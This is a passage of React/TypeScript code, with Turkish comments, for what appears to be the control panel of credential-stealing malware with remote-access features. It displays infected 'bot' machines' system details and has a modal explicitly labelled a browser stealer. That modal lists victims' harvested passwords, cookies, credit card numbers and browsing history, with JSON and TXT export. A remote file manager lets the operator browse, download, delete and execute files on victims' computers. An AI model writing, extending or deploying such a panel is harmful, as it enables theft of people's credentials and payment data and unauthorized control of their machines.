                            <span className="sysinfo-k">{t('sysinfo.user_pc')}</span>
                            <div className="sysinfo-v-box">
                              <span className={`sysinfo-v ${privacyMode ? 'privacy-blur' : ''}`}>{activeSysInfoModal.sysinfo.userName} @ {activeSysInfoModal.sysinfo.pcName}</span>
                            </div>
                          </div>
                          <div className="sysinfo-row">
                            <span className="sysinfo-k">{t('sysinfo.local_ip')}</span>
                            <div className="sysinfo-v-box">
                              <span className={`sysinfo-v monospace ${privacyMode ? 'privacy-blur' : ''}`}>{activeSysInfoModal.sysinfo.localIp || '127.0.0.1'}</span>
                              <button className="browser-copy-btn" onClick={() => handleBrowserCopy(activeSysInfoModal.sysinfo!.localIp || '127.0.0.1', 200003)} title={t('common.copy')}>
                                {browserCopiedId === 200003 ? <Check size={12} color="#ffffff" /> : <Copy size={12} />}
                              </button>
                            </div>
                          </div>
                          <div className="sysinfo-row">
                            <span className="sysinfo-k">{t('sysinfo.mac')}</span>
                            <div className="sysinfo-v-box">
                              <span className={`sysinfo-v monospace ${privacyMode ? 'privacy-blur' : ''}`}>{activeSysInfoModal.sysinfo.macAddress || 'N/A'}</span>
                              {activeSysInfoModal.sysinfo.macAddress && (
                                <button className="browser-copy-btn" onClick={() => handleBrowserCopy(activeSysInfoModal.sysinfo!.macAddress!, 200004)} title={t('common.copy')}>
                                  {browserCopiedId === 200004 ? <Check size={12} color="#ffffff" /> : <Copy size={12} />}
                                </button>
                              )}
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* RIGHT COLUMN: BELLEK & SİSTEM */}
                    <div className="sysinfo-column">
                      {/* 3. BELLEK & DEPOLAMA */}
                      <div className="sysinfo-section expanded">
                        <div className="sysinfo-section-header">
                          <div className="sysinfo-section-title">
                            <HardDrive size={15} />
                            <span>{t('sysinfo.storage')}</span>
                          </div>
                        </div>
                        <div className="sysinfo-section-body">
                          <div className="sysinfo-row">
                            <span className="sysinfo-k">{t('sysinfo.ram')}</span>
                            <div className="sysinfo-v-box">
                              <span className="sysinfo-v highlight">{activeSysInfoModal.sysinfo.ramTotal || 'N/A'}</span>
                            </div>
                          </div>
                          <div className="sysinfo-row">
                            <span className="sysinfo-k">{t('sysinfo.disks')}</span>
                            <div className="sysinfo-v-box">
                              <span className="sysinfo-v monospace">{activeSysInfoModal.sysinfo.disks || 'N/A'}</span>
                            </div>
                          </div>
                          <div className="sysinfo-row">
                            <span className="sysinfo-k">{t('sysinfo.motherboard')}</span>
                            <div className="sysinfo-v-box">
                              <span className="sysinfo-v">{activeSysInfoModal.sysinfo.motherboard || 'N/A'}</span>
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* 4. İŞLETİM SİSTEMİ & GÜVENLİK */}
                      <div className="sysinfo-section expanded">
                        <div className="sysinfo-section-header">
                          <div className="sysinfo-section-title">
                            <Shield size={15} />
                            <span>{t('sysinfo.system')}</span>
                          </div>
                        </div>
                        <div className="sysinfo-section-body">
                          <div className="sysinfo-row">
                            <span className="sysinfo-k">{t('sysinfo.os')}</span>
                            <div className="sysinfo-v-box">
                              <span className="sysinfo-v highlight">{activeSysInfoModal.sysinfo.osInfo || 'N/A'}</span>
                            </div>
                          </div>
                          <div className="sysinfo-row">
                            <span className="sysinfo-k">{t('sysinfo.antivirus')}</span>
                            <div className="sysinfo-v-box">
                              <span className="sysinfo-v">{activeSysInfoModal.sysinfo.antivirus || 'N/A'}</span>
                            </div>
                          </div>
                          <div className="sysinfo-row">
                            <span className="sysinfo-k">{t('sysinfo.uptime')}</span>
                            <div className="sysinfo-v-box">
                              <span className="sysinfo-v">{activeSysInfoModal.sysinfo.uptime || 'N/A'}</span>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>

            <div className="modal-actions" style={{ marginTop: '0.85rem', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <div style={{ fontSize: '0.75rem', color: '#71717a', fontFamily: 'monospace' }}>
                {activeSysInfoModal.sysinfo?.updatedAt && (
                  <span>{t('sysinfo.last_updated')}: {activeSysInfoModal.sysinfo.updatedAt.replace('T', ' ').substring(0, 19)}</span>
                )}
              </div>
              <button className="btn-modal-cancel" onClick={() => setActiveSysInfoModal(null)}>
                {t('common.close')}
              </button>
            </div>
          </div>
        </div>
      )}


      {/* BROWSER STEALER MODAL */}
      {activeBrowserModal !== null && (
        <div className="modal-overlay">
          <div className="modal-content browser-stealer-modal" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header" style={{ justifyContent: 'space-between' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
                <Globe size={20} />
                <h3 style={{ margin: 0 }}>{t('browser.title')} — {activeBrowserModal.pcName}</h3>
                <span className="studio-badge count-badge" style={{ marginLeft: '0.5rem' }}>
                  {browserFilteredData.length} {t('browser.records')}
                </span>
              </div>
              <button
                style={{ background: 'none', border: 'none', color: '#fff', cursor: 'pointer', padding: '0.2rem' }}
                onClick={() => { setActiveBrowserModal(null); setRevealedPasswords(new Set()); }}
              >
                <X size={20} />
              </button>
            </div>

            {/* Browser Tab Bar & Actions */}
            <div className="browser-modal-tabs">
              <div className="browser-tab-group">
                <button
                  className={`browser-modal-tab ${activeBrowserModal.tab === 'passwords' ? 'active' : ''}`}
                  onClick={() => handleBrowserTabChange('passwords')}
                >
                  <Lock size={15} /> 
                  <span>{t('browser.passwords')}</span>
                  <span className="tab-count-pill">{activeBrowserModal.data.filter(d => d.data_type === 'password').length}</span>
                </button>
                <button
                  className={`browser-modal-tab ${activeBrowserModal.tab === 'cookies' ? 'active' : ''}`}
                  onClick={() => handleBrowserTabChange('cookies')}
                >
                  <Globe size={15} /> 
                  <span>{t('browser.cookies')}</span>
                  <span className="tab-count-pill">{activeBrowserModal.data.filter(d => d.data_type === 'cookie').length}</span>
                </button>
                <button
                  className={`browser-modal-tab ${activeBrowserModal.tab === 'cards' ? 'active' : ''}`}
                  onClick={() => handleBrowserTabChange('cards')}
                >
                  <CreditCard size={15} /> 
                  <span>{t('browser.cards')}</span>
                  <span className="tab-count-pill">{activeBrowserModal.data.filter(d => d.data_type === 'card').length}</span>
                </button>
                <button
                  className={`browser-modal-tab ${activeBrowserModal.tab === 'history' ? 'active' : ''}`}
                  onClick={() => handleBrowserTabChange('history')}
                >
                  <Clock size={15} /> 
                  <span>{t('browser.history')}</span>
                  <span className="tab-count-pill">{activeBrowserModal.data.filter(d => d.data_type === 'history').length}</span>
                </button>
              </div>

              <div className="browser-actions-group">
                {activeBrowserModal.tab === 'cookies' && browserFilteredData.length > 0 && (
                  <button
                    type="button"
                    className="browser-export-btn"
                    onClick={handleDownloadCookiesJson}
                    title={t('browser.download_json')}
                  >
                    <Download size={14} /> <span>{t('browser.download_json')}</span>
                  </button>
                )}
                {activeBrowserModal.tab === 'passwords' && browserFilteredData.length > 0 && (
                  <button
                    type="button"
                    className="browser-export-btn"
                    onClick={handleDownloadPasswordsTxt}
                    title={t('browser.download_txt')}
                  >
                    <Download size={14} /> <span>{t('browser.download_txt')}</span>
                  </button>
                )}
                <button
                  className="browser-export-btn fetch-btn"
                  onClick={handleTriggerBrowserScan}
                  disabled={activeBrowserModal.loading}
                  title={t('common.fetch')}
                >
                  <RefreshCw size={14} className={activeBrowserModal.loading ? 'spin-icon' : ''} /> 
                  <span>{activeBrowserModal.loading ? t('browser.fetching') : t('common.fetch')}</span>
                </button>
              </div>
            </div>

            {/* Filter and Search Bar */}
            <div className="browser-modal-toolbar">
              <div className="browser-modal-search">
                <Search size={15} />
                <input
                  type="text"
                  placeholder={t('browser.search_placeholder')}
                  value={activeBrowserModal.search}
                  onChange={(e) => setActiveBrowserModal(prev => prev ? { ...prev, search: e.target.value } : prev)}
                />
                {activeBrowserModal.search && (
                  <button 
                    type="button" 
                    className="search-clear-btn" 
                    onClick={() => setActiveBrowserModal(prev => prev ? { ...prev, search: '' } : prev)}
                  >
                    <X size={13} />
                  </button>
                )}
              </div>

              {/* Tarayıcıya Göre Filtreleme Barı */}
              <div className="browser-brand-filter-bar">
                <button
                  className={`b-filter-btn ${activeBrowserModal.selectedBrowser === 'all' ? 'active' : ''}`}
                  onClick={() => setActiveBrowserModal(prev => prev ? { ...prev, selectedBrowser: 'all' } : prev)}
                >
                  {t('browser.all_browsers')}
                </button>
                <button
                  className={`b-filter-btn chrome ${activeBrowserModal.selectedBrowser === 'chrome' ? 'active' : ''}`}
                  onClick={() => setActiveBrowserModal(prev => prev ? { ...prev, selectedBrowser: 'chrome' } : prev)}
                >
                  Chrome
                </button>
                <button
                  className={`b-filter-btn edge ${activeBrowserModal.selectedBrowser === 'edge' ? 'active' : ''}`}
                  onClick={() => setActiveBrowserModal(prev => prev ? { ...prev, selectedBrowser: 'edge' } : prev)}
                >
                  Edge
                </button>
                <button
                  className={`b-filter-btn brave ${activeBrowserModal.selectedBrowser === 'brave' ? 'active' : ''}`}
                  onClick={() => setActiveBrowserModal(prev => prev ? { ...prev, selectedBrowser: 'brave' } : prev)}
                >
                  Brave
                </button>
                <button
                  className={`b-filter-btn opera ${activeBrowserModal.selectedBrowser === 'opera' ? 'active' : ''}`}
                  onClick={() => setActiveBrowserModal(prev => prev ? { ...prev, selectedBrowser: 'opera' } : prev)}
                >
                  Opera
                </button>
              </div>
            </div>

            {/* Browser Data Content */}
            <div className="browser-modal-body">
              {activeBrowserModal.loading ? (
                <div style={{ textAlign: 'center', padding: '3rem 0', color: '#a1a1aa' }}>
                  <div className="screenshot-spinner" />
                  <p style={{ marginTop: '1rem', fontSize: '0.9rem' }}>{t('browser.fetching')}</p>
                </div>
              ) : browserFilteredData.length === 0 ? (
                <div style={{ textAlign: 'center', padding: '3rem 0', color: '#71717a' }}>
                  <Globe size={40} style={{ opacity: 0.3, marginBottom: '0.5rem' }} />
                  <p style={{ margin: 0, fontWeight: 500 }}>{t('browser.no_data')}</p>
                </div>
              ) : (
                <div className="browser-modal-grid">
                  {/* PASSWORDS */}
                  {activeBrowserModal.tab === 'passwords' && browserFilteredData.map(item => (
                    <div key={item.id} className="browser-data-card">
                      <div className="browser-data-card-header">
                        {getBrowserBadge(item.browser)}
                        <button className="browser-del-btn" onClick={() => handleDeleteBrowserItem(item.id)} title={t('common.delete')}>
                          <Trash2 size={13} />
                        </button>
                      </div>
                      <div className="browser-data-card-body">
                        <div className="browser-data-row">
                          <span className="browser-data-label"><Globe size={13} /> {t('browser.domain')}</span>
                          <span className="browser-data-value">{item.host || '-'}</span>
                        </div>
                        <div className="browser-data-row">
                          <span className="browser-data-label"><FileText size={13} /> {t('browser.user')}</span>
                          <div className="browser-data-value-actions">
                            <span>{item.username || '-'}</span>
                            {item.username && (
                              <button className="browser-copy-btn" onClick={() => handleBrowserCopy(item.username!, item.id)} title={t('common.copy')}>
                                {browserCopiedId === item.id ? <Check size={13} color="#22c55e" /> : <Copy size={13} />}
                              </button>
                            )}
                          </div>
                        </div>
                        <div className="browser-data-row">
                          <span className="browser-data-label"><Lock size={13} /> {t('browser.pass')}</span>
                          <div className="browser-data-value-actions">
                            <span className="browser-password-text">
                              {revealedPasswords.has(item.id) ? item.password : '••••••••'}
                            </span>
                            <button className="browser-copy-btn" onClick={() => togglePasswordReveal(item.id)} title="Show/Hide">
                              {revealedPasswords.has(item.id) ? <EyeOff size={13} /> : <Eye size={13} />}
                            </button>
                            {item.password && (
                              <button className="browser-copy-btn" onClick={() => handleBrowserCopy(item.password!, item.id + 100000)} title={t('common.copy')}>
                                {browserCopiedId === item.id + 100000 ? <Check size={13} color="#22c55e" /> : <Copy size={13} />}
                              </button>
                            )}
                          </div>
                        </div>
                      </div>
                    </div>
                  ))}

                  {/* COOKIES */}
                  {activeBrowserModal.tab === 'cookies' && browserFilteredData.map(item => (
                    <div key={item.id} className="browser-data-card">
                      <div className="browser-data-card-header">
                        {getBrowserBadge(item.browser)}
                        <button className="browser-del-btn" onClick={() => handleDeleteBrowserItem(item.id)} title={t('common.delete')}>
                          <Trash2 size={13} />
                        </button>
                      </div>
                      <div className="browser-data-card-body">
                        <div className="browser-data-row">
                          <span className="browser-data-label"><Globe size={13} /> {t('browser.domain')}</span>
                          <span className="browser-data-value">{item.host || '-'}</span>
                        </div>
                        <div className="browser-data-row">
                          <span className="browser-data-label"><FileText size={13} /> {t('browser.name')}</span>
                          <span className="browser-data-value">{item.cookie_name || '-'}</span>
                        </div>
                        <div className="browser-data-row">
                          <span className="browser-data-label"><Lock size={13} /> {t('browser.value')}</span>
                          <div className="browser-data-value-actions">
                            <span className="browser-cookie-value">{item.cookie_value || '-'}</span>
                            {item.cookie_value && (
                              <button className="browser-copy-btn" onClick={() => handleBrowserCopy(item.cookie_value!, item.id)} title={t('common.copy')}>
                                {browserCopiedId === item.id ? <Check size={13} color="#22c55e" /> : <Copy size={13} />}
                              </button>
                            )}
                          </div>
                        </div>
                      </div>
                    </div>
                  ))}

                  {/* CARDS */}
                  {activeBrowserModal.tab === 'cards' && browserFilteredData.map(item => (
                    <div key={item.id} className="browser-data-card card-special">
                      <div className="browser-data-card-header">
                        {getBrowserBadge(item.browser)}
                        <button className="browser-del-btn" onClick={() => handleDeleteBrowserItem(item.id)} title={t('common.delete')}>
                          <Trash2 size={13} />
                        </button>
                      </div>
                      <div className="browser-data-card-body">
                        <div className="browser-data-row">
                          <span className="browser-data-label"><CreditCard size={13} /> {t('browser.card_no')}</span>
                          <div className="browser-data-value-actions">
                            <span>{item.card_number || '-'}</span>
                            {item.card_number && (
                              <button className="browser-copy-btn" onClick={() => handleBrowserCopy(item.card_number!, item.id)} title={t('common.copy')}>
                                {browserCopiedId === item.id ? <Check size={13} color="#22c55e" /> : <Copy size={13} />}
                              </button>
                            )}
                          </div>
                        </div>
                        <div className="browser-data-row">
                          <span className="browser-data-label"><FileText size={13} /> {t('browser.holder')}</span>
                          <span className="browser-data-value">{item.card_holder || '-'}</span>
                        </div>
                        <div className="browser-data-row">
                          <span className="browser-data-label"><Clock size={13} /> {t('browser.expiry')}</span>
                          <span className="browser-data-value">{item.expiry || '-'}</span>
                        </div>
                      </div>
                    </div>
                  ))}

                  {/* HISTORY */}
                  {activeBrowserModal.tab === 'history' && browserFilteredData.map(item => (
                    <div key={item.id} className="browser-data-card">
                      <div className="browser-data-card-header">
                        {getBrowserBadge(item.browser)}
                        <button className="browser-del-btn" onClick={() => handleDeleteBrowserItem(item.id)} title={t('common.delete')}>
                          <Trash2 size={13} />
                        </button>
                      </div>
                      <div className="browser-data-card-body">
                        <div className="browser-data-row">
                          <span className="browser-data-label"><Globe size={13} /> {t('browser.url')}</span>
                          <div className="browser-data-value-actions">
                            <span title={item.host}>{item.host || '-'}</span>
                            {item.host && (
                              <button className="browser-copy-btn" onClick={() => handleBrowserCopy(item.host!, item.id)} title={t('common.copy')}>
                                {browserCopiedId === item.id ? <Check size={13} color="#22c55e" /> : <Copy size={13} />}
                              </button>
                            )}
                          </div>
                        </div>
                        <div className="browser-data-row">
                          <span className="browser-data-label"><FileText size={13} /> {t('browser.url_title')}</span>
                          <span className="browser-data-value" title={item.username}>{item.username || '-'}</span>
                        </div>
                        <div className="browser-data-row">
                          <span className="browser-data-label"><Clock size={13} /> {t('browser.visits')}</span>
                          <span className="browser-data-value">{item.password ? `${item.password} ${t('browser.times')}` : `1 ${t('browser.times')}`}</span>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="modal-actions" style={{ marginTop: '0.5rem' }}>
              <button className="btn-modal-cancel" onClick={() => { setActiveBrowserModal(null); setRevealedPasswords(new Set()); }}>
                {t('common.close')}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* FILE MANAGER MODAL (Bot Kartından Açılan Özellik Modalı) */}
      {activeFileManagerModal !== null && (
        <div 
          className="modal-overlay" 
          onClick={() => {
            if (activeFileManagerModal.contextMenu) {
              setActiveFileManagerModal(prev => prev ? { ...prev, contextMenu: null } : null);
            } else {
              setActiveFileManagerModal(null);
            }
          }}
        >
          <div 
            className="modal-content sysinfo-modal fm-modal-window" 
            onClick={(e) => {
              e.stopPropagation();
              if (activeFileManagerModal.contextMenu) {
                setActiveFileManagerModal(prev => prev ? { ...prev, contextMenu: null } : null);
              }
            }} 
            style={{ maxWidth: '1150px', width: '94vw', height: '86vh', display: 'flex', flexDirection: 'column' }}
          >
            <div className="modal-header" style={{ justifyContent: 'space-between', borderBottom: '1px solid #1a1a1a', paddingBottom: '0.75rem' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
                <FolderOpen size={20} color="#ffffff" />
                <h3 style={{ margin: 0, color: '#ffffff' }}>{t('filemanager.title')} — <span className={privacyMode ? 'privacy-blur' : ''}>{activeFileManagerModal.pcName}</span></h3>
              </div>
              <button
                style={{ background: 'none', border: 'none', color: '#fff', cursor: 'pointer', padding: '0.2rem' }}
                onClick={() => setActiveFileManagerModal(null)}
              >
                <X size={20} />
              </button>
            </div>

            {/* LIVE DOWNLOAD PROGRESS BAR (%) */}
            {activeFileManagerModal.downloadProgress && (
              <div className="fm-progress-card">
                <div className="fm-progress-header">
                  <div className="fm-progress-title">
                    <Download size={14} className={activeFileManagerModal.downloadProgress.status === 'downloading' ? 'spin-icon' : ''} />
                    <span className="fm-progress-filename">{activeFileManagerModal.downloadProgress.fileName}</span>
                    <span className="fm-progress-status-badge">
                      {activeFileManagerModal.downloadProgress.status === 'preparing' && t('filemanager.preparing')}
                      {activeFileManagerModal.downloadProgress.status === 'downloading' && `${t('filemanager.downloading')} (%${activeFileManagerModal.downloadProgress.percent})`}
                      {activeFileManagerModal.downloadProgress.status === 'completed' && `${t('filemanager.completed')}`}
                      {activeFileManagerModal.downloadProgress.status === 'error' && 'Error'}
                    </span>
                  </div>
                  <span className="fm-progress-pct-text">%{activeFileManagerModal.downloadProgress.percent}</span>
                </div>
                <div className="fm-progress-bar-bg">
                  <div 
                    className={`fm-progress-bar-fill ${activeFileManagerModal.downloadProgress.status}`} 
                    style={{ width: `${activeFileManagerModal.downloadProgress.percent}%` }} 
                  />
                </div>
              </div>
            )}

            <div className="fm-container-modal" style={{ padding: '0.75rem 0 0 0', flex: 1, display: 'flex', flexDirection: 'column', minHeight: 0 }}>
              {/* Toolbar: Breadcrumb + Search + Buttons */}
              <div className="fm-toolbar">
                <div className="fm-breadcrumb">
                  <span
                    className={`fm-crumb fm-crumb-root ${activeFileManagerModal.isDrivesView ? 'active' : ''}`}
                    onClick={handleFmGoDrives}
                  >
                    <HardDrive size={13} style={{ marginRight: '4px', verticalAlign: 'middle' }} />
                    {t('filemanager.this_pc')}
                  </span>
                  {!activeFileManagerModal.isDrivesView && buildFmBreadcrumb(activeFileManagerModal.currentPath).map((crumb, i, arr) => (
                    <React.Fragment key={i}>
                      <span className="fm-crumb-sep">\</span>
                      <span
                        className={`fm-crumb ${i === arr.length - 1 ? 'active' : ''}`}
                        onClick={() => {
                          if (i < arr.length - 1) {
                            setActiveFileManagerModal(prev => prev ? { ...prev, loading: true, files: [], search: '', contextMenu: null } : null);
                            sendFmCommand(activeFileManagerModal.pcName, 'file_list', crumb.path);
                          }
                        }}
                      >
                        {crumb.label}
                      </span>
                    </React.Fragment>
                  ))}
                </div>

                <div className="fm-toolbar-right">
                  {/* ARAMA ÇUBUĞU */}
                  {!activeFileManagerModal.isDrivesView && (
                    <div className="fm-search-wrap">
                      <Search size={14} color="#666" />
                      <input
                        type="text"
                        placeholder={t('common.search')}
                        value={activeFileManagerModal.search}
                        onChange={(e) => setActiveFileManagerModal(prev => prev ? { ...prev, search: e.target.value } : prev)}
                        className="fm-search-input"
                      />
                      {activeFileManagerModal.search && (
                        <button 
                          className="fm-search-clear" 
                          onClick={() => setActiveFileManagerModal(prev => prev ? { ...prev, search: '' } : prev)}
                        >
                          <X size={12} />
                        </button>
                      )}
                    </div>
                  )}

                  <div className="fm-toolbar-actions">
                    <button 
                      className="fm-action-btn" 
                      onClick={handleFmGoUp} 
                      disabled={activeFileManagerModal.isDrivesView}
                      title={t('filemanager.go_up')}
                    >
                      ↑
                    </button>
                    <button className="fm-action-btn" onClick={handleFmRefresh} title={t('filemanager.refresh')}>⟳</button>
                  </div>
                </div>
              </div>

              {/* Table / Drive Wrapper */}
              <div className="fm-table-wrap" style={{ flex: 1, maxHeight: 'none' }}>
                {activeFileManagerModal.loading && (
                  <div className="fm-loading">
                    <div className="fm-spinner" />
                    <span>{t('filemanager.loading')}</span>
                  </div>
                )}
                {!activeFileManagerModal.loading && activeFileManagerModal.error && (
                  <div className="fm-error">{activeFileManagerModal.error}</div>
                )}

                {/* DRIVES VIEW (DİSK SEÇİMİ) */}
                {!activeFileManagerModal.loading && !activeFileManagerModal.error && activeFileManagerModal.isDrivesView && (
                  <div className="fm-drives-grid">
                    {activeFileManagerModal.files.map((drive, i) => {
                      const totalGB = drive.size > 0 ? (drive.size / (1024 * 1024 * 1024)).toFixed(1) : '0';
                      const freeGB = drive.free && drive.free > 0 ? (drive.free / (1024 * 1024 * 1024)).toFixed(1) : '0';
                      const usedPercent = drive.size > 0 && drive.free ? Math.round(((drive.size - drive.free) / drive.size) * 100) : 0;
                      return (
                        <div
                          key={i}
                          className="fm-drive-card"
                          onClick={() => handleFmNavigate(drive)}
                        >
                          <div className="fm-drive-card-header">
                            <div className="fm-drive-icon-wrap">
                              <HardDrive size={30} color="#ffffff" />
                            </div>
                            <div className="fm-drive-info">
                              <span className="fm-drive-title">{t('filemanager.local_disk')} ({drive.name.replace(/\\/g, '')})</span>
                              <span className="fm-drive-space-text">{freeGB} GB {t('filemanager.free')} / {totalGB} GB</span>
                            </div>
                          </div>
                          {drive.size > 0 && (
                            <div className="fm-drive-meter-bg">
                              <div 
                                className={`fm-drive-meter-fill ${usedPercent > 90 ? 'critical' : ''}`} 
                                style={{ width: `${usedPercent}%` }} 
                              />
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                )}

                {/* NORMAL FILE & FOLDER LIST */}
                {!activeFileManagerModal.loading && !activeFileManagerModal.error && !activeFileManagerModal.isDrivesView && (
                  <>
                    {(() => {
                      const filtered = activeFileManagerModal.files.filter(f => 
                        !activeFileManagerModal.search || f.name.toLowerCase().includes(activeFileManagerModal.search.toLowerCase())
                      );
                      if (filtered.length === 0) {
                        return <div className="fm-empty">{t('filemanager.no_data')}</div>;
                      }
                      return (
                        <table className="fm-table">
                          <thead>
                            <tr>
                              <th>{t('filemanager.name')}</th>
                              <th>{t('filemanager.size')}</th>
                              <th>{t('filemanager.modified')}</th>
                            </tr>
                          </thead>
                          <tbody>
                            {filtered.map((entry, i) => {
                              const isSelected = activeFileManagerModal.selectedEntryPath === entry.path;
                              return (
                                <tr 
                                  key={i} 
                                  className={`${entry.isDir ? 'fm-row-dir' : 'fm-row-file'} ${isSelected ? 'selected' : ''}`}
                                  onClick={() => setActiveFileManagerModal(prev => prev ? { ...prev, selectedEntryPath: entry.path, contextMenu: null } : null)}
                                  onDoubleClick={() => entry.isDir && handleFmNavigate(entry)}
                                  onContextMenu={(e) => handleFmRowContextMenu(e, entry)}
                                >
                                  <td>
                                    <div
                                      className={`fm-name ${entry.isDir ? 'dir' : 'file'}`}
                                      onClick={() => entry.isDir && handleFmNavigate(entry)}
                                      title={entry.path}
                                    >
                                      <span className="fm-icon">
                                        {entry.isDir ? <Folder size={16} color="#ffffff" /> : <FileText size={16} color="#a1a1aa" />}
                                      </span>
                                      <span className="fm-filename-text">{entry.name}</span>
                                    </div>
                                  </td>
                                  <td className="fm-size">{entry.isDir ? '—' : fmFormatBytes(entry.size)}</td>
                                  <td className="fm-modified">{entry.modified}</td>
                                </tr>
                              );
                            })}
                          </tbody>
                        </table>
                      );
                    })()}
                  </>
                )}
              </div>
            </div>

            <div className="modal-actions" style={{ marginTop: '0.75rem', justifyContent: 'flex-end', alignItems: 'center' }}>
              <button className="btn-modal-cancel" onClick={() => setActiveFileManagerModal(null)}>
                {t('common.close')}
              </button>
            </div>
          </div>

          {/* SAĞ TIK CONTEXT MENÜSÜ */}
          {activeFileManagerModal.contextMenu && activeFileManagerModal.contextMenu.visible && (
            <div
              className="fm-context-menu"
              style={{
                top: `${activeFileManagerModal.contextMenu.y}px`,
                left: `${activeFileManagerModal.contextMenu.x}px`
              }}
              onClick={(e) => e.stopPropagation()}
            >
              <div className="fm-context-header">
                <span className="fm-context-target-name">{activeFileManagerModal.contextMenu.entry.name}</span>
              </div>

              {!activeFileManagerModal.contextMenu.entry.isDir ? (
                <>
                  <button
                    className="fm-context-item download"
                    onClick={() => {
                      const ent = activeFileManagerModal.contextMenu!.entry;
                      handleFmDownload(ent);
                    }}
                  >
                    <Download size={14} />
                    <span>{t('filemanager.download')}</span>
                  </button>

                  <button
                    className="fm-context-item exec"
                    onClick={() => {
                      const ent = activeFileManagerModal.contextMenu!.entry;
                      setActiveFileManagerModal(prev => prev ? { ...prev, execTarget: ent, contextMenu: null } : null);
                    }}
                  >
                    <Play size={14} />
                    <span>{t('filemanager.execute')}</span>
                  </button>
                </>
              ) : (
                <button
                  className="fm-context-item open"
                  onClick={() => {
                    const ent = activeFileManagerModal.contextMenu!.entry;
                    handleFmNavigate(ent);
                  }}
                >
                  <FolderOpen size={14} />
                  <span>{t('filemanager.open')}</span>
                </button>
              )}

              <div className="fm-context-divider" />

              <button
                className="fm-context-item delete"
                onClick={() => {
                  const ent = activeFileManagerModal.contextMenu!.entry;
                  setActiveFileManagerModal(prev => prev ? { ...prev, deleteTarget: ent, contextMenu: null } : null);
                }}
              >
                <Trash2 size={14} />
                <span>{t('filemanager.delete')}</span>
              </button>
            </div>
          )}
        </div>
      )}

      {/* Delete Confirm Sub-modal */}
      {activeFileManagerModal?.deleteTarget && (
        <div className="modal-overlay" style={{ zIndex: 10005 }} onClick={() => setActiveFileManagerModal(prev => prev ? { ...prev, deleteTarget: null } : null)}>
          <div className="modal-content" style={{ maxWidth: '440px' }} onClick={e => e.stopPropagation()}>
            <h3 className="modal-title" style={{ margin: 0 }}>{t('filemanager.delete_title')}</h3>
            <p className="modal-body" style={{ margin: '0.75rem 0 1.25rem 0', color: '#a1a1aa', fontSize: '0.9rem' }}>
              {t('filemanager.delete_confirm')}
              <br />
              <span style={{ color: '#ff4444', wordBreak: 'break-all' }}>{activeFileManagerModal.deleteTarget.path}</span>
            </p>
            <div className="modal-actions">
              <button className="btn-modal-cancel" onClick={() => setActiveFileManagerModal(prev => prev ? { ...prev, deleteTarget: null } : null)}>{t('common.cancel')}</button>
              <button className="btn-modal-delete" onClick={handleFmDeleteConfirm}>{t('filemanager.delete')}</button>
            </div>
          </div>
        </div>
      )}

      {/* Exec Confirm Sub-modal */}
      {activeFileManagerModal?.execTarget && (
        <div className="modal-overlay" style={{ zIndex: 10005 }} onClick={() => setActiveFileManagerModal(prev => prev ? { ...prev, execTarget: null } : null)}>
          <div className="modal-content" style={{ maxWidth: '440px' }} onClick={e => e.stopPropagation()}>
            <h3 className="modal-title" style={{ margin: 0 }}>{t('filemanager.exec_title')}</h3>
            <p className="modal-body" style={{ margin: '0.75rem 0 1.25rem 0', color: '#a1a1aa', fontSize: '0.9rem' }}>
              {t('filemanager.exec_confirm')}
              <br />
              <span style={{ color: '#ffaa00', wordBreak: 'break-all' }}>{activeFileManagerModal.execTarget.path}</span>
            </p>
            <div className="modal-actions">
              <button className="btn-modal-cancel" onClick={() => setActiveFileManagerModal(prev => prev ? { ...prev, execTarget: null } : null)}>{t('common.cancel')}</button>
              <button className="btn-exec" onClick={handleFmExecConfirm}>{t('filemanager.execute')}</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};


